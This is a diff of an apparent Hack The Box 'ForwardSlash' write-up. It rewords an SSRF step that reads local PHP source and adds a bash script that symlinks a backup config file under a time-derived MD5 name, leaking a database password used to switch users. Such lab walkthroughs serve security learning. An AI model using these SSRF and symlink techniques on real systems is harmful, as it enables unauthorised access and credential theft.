@@ -70,7 +70,7 @@ Using Burp, I can send a POST request to`profilepicture.php`and send it to the r
 
 From the`/etc/passwd` file, I find two users:`chiv`and`pain`
 
-I remember how`/dev` could not be accessed from my box. By using the http URI handler in the`url` parameter I can send requests that originate from localhost to get around the IP restriction, reaching an API test page. I could not find anything useful out of this so I try to retrieve the PHP source code of`/dev/index.php`.
+I remember how`/dev` could not be accessed from my box. By using the http URI handler in the url parameter, I can send requests that originate from localhost to get around the IP restriction to reach an API test page. I could not find anything useful out of this, so I try to retrieve the PHP source code of`/dev/index.php`.
 ```
 POST /profilepicture.php HTTP/1.1
 Host: backup.forwardslash.htb
@@ -219,3 +219,62 @@ Even though I am logged in as user`chiv` I cannot read the user flag because it 
 
 Once I run the binary, it shows this output.
 ![image]({{0xtaylur.github.io}}/assets/forwardslash/backup_binary.png)
+
+The generated MD5 hash in the binary output changes everytime it's executed. In the output, I notice it mentions that it's a time based backup viewer. This is why the hash is different everytime, it takes the local time and coverts it to MD5. I created a bash script to check if the MD5 value will be the same.
+```bash
+time="$(date + %H:%M:%S | tr -d '\n' |md5sum | tr -d ' -')"
+echo $time
+backup
+```
+
+I run my bash script to test and see if I was right.
+![image]({{0xtaylur.github.io}}/assets/forwardslash/test_sh.png)
+
+The MD5 value is the same, but still nothing happens. I found a file named`config.php.bak` that turns out to be the old config file from the binary we run. I edited my bash script to include the backup file.
+```bash
+time="$(date +%H:%M:%S | tr -d '\n' |md5sum | tr -d ' -')"
+echo $time
+ln -s /var/backups/config.php.bak /home/chiv/$time
+backup
+```
+
+I end up with a different result that contains the credentials for`pain`.
+```
+chiv@forwardslash:~$ ./test.sh
+f9aacbe79f6628030ffa65f21335e0d4
+----------------------------------------------------------------------
+        Pain's Next-Gen Time Based Backup Viewer
+        v0.1
+        NOTE: not reading the right file yet, 
+        only works if backup is taken in same second
+----------------------------------------------------------------------
+
+Current Time: 01:21:24
+<?php
+/* Database credentials. Assuming you are running MySQL
+server with default setting (user 'root' with no password) */
+define('DB_SERVER', 'localhost');
+define('DB_USERNAME', 'pain');
+define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
+define('DB_NAME', 'site');
+ 
+/* Attempt to connect to MySQL database */
+$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
+ 
+// Check connection
+if($link === false){
+    die("ERROR: Could not connect. " . mysqli_connect_error());
+}
+?>
+```
+
+I can now login as user`pain`.
+
+### Privilege Escalation
+
+```
+chiv@forwardslash:~$ su - pain
+Password: 
+pain@forwardslash:~$ 
+```
+
